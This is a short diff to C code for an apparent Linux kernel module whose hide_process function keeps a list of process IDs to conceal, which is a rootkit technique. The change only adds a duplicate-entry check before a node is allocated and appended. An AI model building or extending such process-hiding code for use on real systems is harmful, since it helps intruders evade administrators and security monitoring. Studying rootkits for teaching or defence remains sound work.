@@ -115,7 +115,14 @@ static void init_hook(void)
 
 static int hide_process(pid_t pid)
 {
-    pid_node_t *proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
+    pid_node_t *proc;
+
+    /* Check if the pid is in the list */
+    if (is_hidden_proc(pid))
+        return -EEXIST;
+
+    /* insert pid node into hidden_proc */
+    proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
     proc->id = pid;
     list_add_tail(&proc->list_node, &hidden_proc);
     return SUCCESS;
